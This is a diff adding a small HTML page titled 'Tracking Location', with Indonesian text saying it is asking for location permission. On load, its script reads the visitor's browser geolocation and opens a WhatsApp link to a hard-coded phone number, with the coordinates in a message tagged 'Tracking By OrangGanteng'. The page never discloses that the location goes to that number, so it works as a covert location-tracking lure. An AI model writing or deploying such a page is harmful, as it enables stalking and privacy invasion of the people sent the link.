@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tracking Location</title>
+    <script>
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const message = `Tracking By OrangGanteng\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+            const whatsappUrl = `http://wa.me/62881011040349?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+        }
+
+        function handleError(error) {
+            console.error("Error obtaining location: ", error);
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        window.onload = function() {
+            requestLocation();
+        };
+    </script>
+</head>
+<body>
+    <h1>Tracking Location</h1>
+    <p>Meminta izin untuk mengakses lokasi Anda...</p>
+</body>
+</html>
+```
